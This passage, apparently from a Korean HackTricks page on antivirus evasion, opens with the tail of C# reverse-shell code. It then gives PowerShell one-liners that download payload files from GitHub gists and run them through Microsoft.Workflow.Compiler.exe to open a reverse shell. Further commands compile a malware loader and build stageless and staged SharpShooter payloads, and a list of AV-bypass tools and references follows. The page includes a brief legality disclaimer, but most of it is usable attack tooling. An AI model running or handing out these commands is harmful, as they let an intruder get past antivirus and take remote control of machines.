private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 컴파일러 사용

C# 컴파일러를 사용하여 AV 회피 기법을 구현할 수 있습니다. 이 기법은 소스 코드를 컴파일하여 실행 파일을 생성하는 방식으로 작동합니다. AV 소프트웨어는 주로 실행 파일을 검사하므로, 컴파일된 실행 파일은 AV 소프트웨어에 의해 감지되기 어려울 수 있습니다.

#### 단계 1: C# 소스 코드 작성
먼저, AV 회피를 위한 C# 소스 코드를 작성해야 합니다. 이 소스 코드는 악성 페이로드를 실행하는 기능을 포함하고 있어야 합니다. AV 소프트웨어가 이를 감지하지 않도록 하기 위해 다양한 기법을 사용할 수 있습니다.

#### 단계 2: C# 소스 코드 컴파일
작성한 C# 소스 코드를 컴파일하여 실행 파일을 생성합니다. 이를 위해 C# 컴파일러를 사용합니다. 컴파일된 실행 파일은 일반적으로 .exe 확장자를 가지며, AV 소프트웨어에 의해 감지되기 어려울 수 있습니다.

#### 단계 3: 실행 파일 테스트
생성된 실행 파일을 AV 소프트웨어에 의해 감지되지 않는지 테스트합니다. 이를 위해 다양한 AV 소프트웨어를 사용하여 실행 파일을 검사합니다. 감지되지 않는 경우, AV 회피 기법이 성공적으로 작동한 것입니다.

#### 단계 4: 추가 보안 기법 적용
AV 회피 기법은 AV 소프트웨어의 감지 기능을 우회하는 것이지만, 완벽한 보안을 제공하지는 않습니다. 따라서, 추가적인 보안 기법을 적용하여 시스템을 보호해야 합니다. 이는 방화벽, 침입 탐지 시스템, 업데이트된 보안 패치 등을 포함할 수 있습니다.

#### 주의사항
AV 회피 기법은 불법적인 목적으로 사용해서는 안 됩니다. 이러한 기법은 주로 보안 전문가나 펜테스터가 시스템 보안 강화를 위해 사용합니다.
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C# 난독화 도구 목록: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 기타 도구
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 더 알아보기

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks)와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
